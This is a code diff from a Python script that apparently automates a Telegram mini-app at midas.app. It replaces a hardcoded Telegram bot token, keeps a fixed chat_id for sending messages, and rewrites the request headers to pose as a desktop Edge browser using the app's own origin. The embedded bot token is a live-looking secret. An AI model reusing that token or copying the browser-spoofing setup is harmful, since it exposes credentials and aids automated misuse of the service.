@@ -16,7 +16,7 @@ CYAN = Fore.CYAN + Style.BRIGHT
 WHITE = Fore.WHITE + Style.BRIGHT
  
 
-bot_token = "7468313179:AAF0bAZBKbbnX_vuj5DFRH6dFq-WR5iCa5w"
+bot_token = "7468313179:AAHSBWiM3ULtKjtYdRbMSnae1INMtTkQy0w"
 chat_id = "968480911"
 
 def send_telegram_message(bot_token, chat_id, message):
@@ -40,9 +40,18 @@ def send_telegram_message(bot_token, chat_id, message):
 
 def get_headers(access_token=None):
     headers = {
-        "accept": "application/json, text/plain, */*",
-        "content-type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'Cache-Control': 'no-cache',
+        'Host': 'api-tg-app.midas.app',
+        'Origin': 'https://prod-tg-app.midas.app',
+        'Pragma': 'no-cache',
+        'Referer': 'https://prod-tg-app.midas.app/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'Content-Type': 'application/json'
     }
 
     if access_token:
